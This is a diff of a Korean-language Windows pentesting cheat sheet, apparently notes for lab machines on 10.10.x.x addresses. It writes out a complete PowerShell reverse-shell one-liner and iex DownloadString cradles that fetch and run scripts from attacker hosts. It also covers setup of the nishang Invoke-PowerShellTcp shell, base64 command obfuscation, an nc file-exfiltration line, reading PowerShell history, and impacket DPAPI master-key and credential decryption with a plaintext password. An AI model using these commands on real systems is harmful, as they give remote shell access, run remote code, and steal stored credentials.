@@ -1,4 +1,76 @@
 <details>
+ <summary><strong>PowerShell History</strong></summary>
+
+```powershell
+$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+$historyPath
+
+# 파일이 존재하는지 확인
+Test-Path $historyPath
+
+# 히스토리 내용 보기
+Get-Content $historyPath
+```
+ 
+</details>
+
+---
+<details>
+ <summary><strong>Powershell Reverse Shell</strong></summary>
+
+### One liner
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+### Invoke-PowerShellTcp.ps1
+```bash
+cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+```
+- `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443`를 아래에 추가.
+
+```powershell
+powershell "iex(new-object net.webclient).downloadstring('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"
+
+echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.23/rev.ps1") | powershell -noprofile
+
+powershell -encodedcommand <base64>
+```
+
+</details>
+
+---
+<details>
+ <summary><strong>DPAPI</strong></summary>
+
+## DPAPI란?
+- Windows에서 제공하는 암호화 API로, 사용자 또는 시스템 수준에서 민감한 데이터를 보호합니다.
+- `WINRM`으로 다운로드시에 숨김파일로 인해서 다운로드 불가능할 수 있음.
+
+## 위치
+```powershell
+# masterkey
+C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<masterkey>
+
+# credential key
+C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\<credential key>
+```
+
+## masterkey 복호화
+```bash
+impacket-dpapi masterkey -file masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
+```
+
+## Credential files 복호화
+```bash
+# 복호화된 마스터키를 가지고 자격 증명 파일 복호화
+impacket-dpapi credential -file <credential file> -key <복호화된 master key>
+```
+ 
+</details>
+
+---
+<details>
  <summary><strong>WINRM hidden file download</strong></summary>
 
 - `evil-winrm`으로 접속하여 숨김파일 다운로드시 실패하는 경우 발생.
@@ -88,40 +160,20 @@ powershell -c "$WScript = New-Object -ComObject WScript.Shell; $SC = Get-ChildIt
 
 ---
 <details>
- <summary><strong>Linux to Windows encoding(base64)</strong></summary>
+ <summary><strong>base64</strong></summary>
 
+## linux to windows
 ```bash
 echo -n iex(new-object net.webclient).downloadstring('http://10.10.16.3/Invoke-PowerShellTcp.ps1') | iconv --to-code UTF-16LE | base64 -w0
 ```
+
+## windows to linux
 ```powershell
-powershell -encodedcommand <encoded>
+certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 output
+
+type output
 ```
  
-</details>
-
----
-<details>
- <summary><strong>Powershell Reverse Shell</strong></summary>
-
-### One liner
-```powershell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-```
-
-### Invoke-PowerShellTcp.ps1
-```bash
-cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
-```
-- `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443`를 아래에 추가.
-
-```powershell
-powershell "iex(new-object net.webclient).downloadstring('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"
-
-echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.23/rev.ps1") | powershell -noprofile
-
-powershell -encodedcommand <base64>
-```
-
 </details>
 
 ---
@@ -164,23 +216,6 @@ nc 10.10.10.10 80 < file.txt
 
 ```powershelll
 type <file> | findstr /I /N 'NTLM'
-```
- 
-</details>
-
----
-<details>
- <summary><strong>PowerShell History</strong></summary>
-
-```powershell
-$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-$historyPath
-
-# 파일이 존재하는지 확인
-Test-Path $historyPath
-
-# 히스토리 내용 보기
-Get-Content $historyPath
 ```
  
 </details>
@@ -662,27 +697,6 @@ get-itemproperty -path .
 sqlcmd -?
 
 sqlcmd -q 'SELECT table_name from adsync.information_schema.tables';
-```
- 
-</details>
-
----
-<details>
- <summary><strong>DPAPI</strong></summary>
-
-## DPAPI란?
-- Windows에서 제공하는 암호화 API로, 사용자 또는 시스템 수준에서 민감한 데이터를 보호합니다.
-- `WINRM`으로 다운로드시에 숨김파일로 인해서 다운로드 불가능할 수 있음.
-
-## masterkey 복호화
-```bash
-impacket-dpapi masterkey -file masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
-```
-
-## Credential files 복호화
-```bash
-# 복호화된 마스터키를 가지고 자격 증명 파일 복호화
-impacket-dpapi credential -file <credential file> -key <복호화된 master key>
 ```
  
 </details>
